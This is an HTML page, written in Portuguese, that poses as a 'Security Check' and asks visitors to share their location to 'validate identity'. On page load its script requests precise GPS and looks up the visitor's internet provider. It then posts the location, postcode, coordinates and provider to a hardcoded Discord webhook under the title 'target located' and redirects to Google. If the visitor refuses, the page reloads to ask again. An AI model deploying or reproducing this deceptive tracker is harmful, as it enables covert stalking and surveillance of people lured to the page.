<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; background: #f7f7f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>Verificando sua conex√£o...</h3>
        <p style="color: #666; font-size: 14px;">Por favor, <b>permita o acesso √† localiza√ß√£o</b> para validar sua identidade e continuar.</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";

        async function obterCidadeReal(lat, lon) {
            try {
                // Usa o servi√ßo do OpenStreetMap para converter coordenadas em endere√ßo real (Cidade/CEP)
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await res.json();
                return {
                    cidade: data.address.city || data.address.town || data.address.village || "N√£o encontrada",
                    estado: data.address.state || "N/A",
                    cep: data.address.postcode || "N√£o detectado",
                    pais: data.address.country || "Brasil"
                };
            } catch (e) {
                return null;
            }
        }

        function enviarParaDiscord(dados) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "üéØ ALVO LOCALIZADO (PRECIS√ÉO M√ÅXIMA)",
                        color: 65280,
                        fields: [
                            { name: "üö© Pais:", value: dados.pais, inline: true },
                            { name: "üèõÔ∏è Estado:", value: dados.estado, inline: true },
                            { name: "üèôÔ∏è Cidade:", value: dados.cidade, inline: true },
                            { name: "üìÆ Cep:", value: dados.cep, inline: true },
                            { name: "üìç Coordenadas:", value: `[Abrir no Maps](https://www.google.com/maps?q=${dados.lat},${dados.lon})`, inline: false },
                            { name: "üåê Internet/Provedor:", value: dados.provedor, inline: false },
                            { name: "‚è∞ Hor√°rio de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
                        ],
                        footer: { text: "Rastreio via GPS Sat√©lite" }
                    }]
                })
            }).then(() => {
                window.location.href = "https://google.com";
            });
        }

        window.onload = async () => {
            // Pega o IP e Provedor em segundo plano
            let provedor = "Desconhecido";
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                provedor = ipData.org;
            } catch(e) {}

            // Solicita GPS
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // Converte a latitude/longitude na sua CIDADE REAL
                    const local = await obterCidadeReal(lat, lon);

                    enviarParaDiscord({
                        pais: local.pais,
                        estado: local.estado,
                        cidade: local.cidade,
                        cep: local.cep,
                        lat: lat,
                        lon: lon,
                        provedor: provedor
                    });

                }, (erro) => {
                    alert("Para acessar o site, voc√™ precisa permitir a localiza√ß√£o.");
                    location.reload(); // Recarrega para pedir de novo
                }, { enableHighAccuracy: true });
            }
        };
    </script>
</body>
</html>
